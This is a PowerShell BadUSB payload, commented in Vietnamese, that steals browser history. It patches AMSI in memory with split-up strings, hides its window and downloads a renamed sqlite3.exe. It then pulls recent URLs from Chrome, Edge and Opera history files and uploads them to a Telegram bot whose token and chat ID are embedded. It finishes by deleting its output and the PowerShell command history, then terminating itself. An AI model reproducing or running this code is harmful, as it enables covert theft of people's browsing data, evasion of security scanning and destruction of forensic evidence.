<# 
=================================================================================================
PROJECT: PHYSICAL ACCESS EXPLOITATION (BADUSB) - FINAL STEALTH VERSION
MODULE: BROWSER DATA EXFILTRATION (BYPASS AMSI + AUTO-SQLITE)
=================================================================================================
#>
param($h = 'y')

# --- 1. SIÊU LÀM RỐI AMSI BYPASS (Patching trực tiếp trong RAM) ---
# Chia nhỏ từ khóa 'AmsiUtils' và 'amsiInitFailed' để bypass quét tĩnh
try {
    $m1 = 'System.Management.Automation.'
    $m2 = 'A' + 'm' + 'si' + 'Ut' + 'ils'
    $f1 = 'a' + 'm' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed'
    $u = [Ref].Assembly.GetType($m1 + $m2)
    $u.GetField($f1, 'NonPublic,Static').SetValue($null, $true)
} catch { }

# --- 2. TỰ ĐỘNG ẨN CỬA SỔ (STEALTH MODE) ---
if($h -eq 'y'){
    $win = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $type = Add-Type -MemberDefinition $win -Name ("W" + (Get-Random)) -PassThru
    [void]$type::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0)
}

# --- 3. CẤU HÌNH & TỰ TẢI SQLITE3 (QUAN TRỌNG) ---
$sqlDir = Join-Path $env:TEMP "db_util"
if (!(Test-Path $sqlDir)) { New-Item -ItemType Directory -Path $sqlDir -Force | Out-Null }
$sqlPath = Join-Path $sqlDir "s3.exe" # Đổi tên né quét

if (!(Test-Path $sqlPath)) {
    # Thay link này bằng link RAW file sqlite3.exe trên GitHub của Quân
    $uSql = "https://github.com/khangpdm/BadUSB/raw/main/sqlite3.exe"
    (New-Object Net.WebClient).DownloadFile($uSql, $sqlPath)
}

# --- 4. THIẾT LẬP TELEGRAM ---
$k1 = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$k2 = "8312702210"
$tele = "h"+"tt"+"ps://ap"+"i.te"+"le"+"gr"+"am.or"+"g/bo"+"t" + $k1 + "/sendDocument"
$out = Join-Path $env:TEMP ("sys_" + (Get-Random) + ".txt")

# --- 5. THU THẬP DỮ LIỆU (CHROME, EDGE, OPERA) ---
$Paths = @{
    'CH_H' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'ED_H' = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'OP_H' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
}

"--- REPORT | $(Get-Date) ---" | Out-File $out -Encoding UTF8

foreach ($k in $Paths.Keys) {
    $p = $Paths[$k]
    if (Test-Path $p) {
        try {
            $tmp = Join-Path $env:TEMP ("t_" + (Get-Random))
            Copy-Item $p $tmp -Force
            if (Test-Path $sqlPath) {
                # Truy vấn lấy 15 URL gần nhất
                & $sqlPath $tmp "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 15;" | ForEach-Object {
                    "$k | $_" | Out-File $out -Append -Encoding UTF8
                }
            }
            Remove-Item $tmp -Force
        } catch { continue }
    }
}

# --- 6. GỬI VỀ TELEGRAM & XÓA DẤU VẾT ---
if (Test-Path $out) {
    curl.exe -X POST $tele -F "chat_id=$k2" -F "document=@$out" | Out-Null
    Remove-Item $out -Force
}

# Anti-Forensics: Xóa lịch sử lệnh
$hp = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $hp) { Remove-Item $hp -Force -ErrorAction SilentlyContinue }
Stop-Process -Id $PID -Force
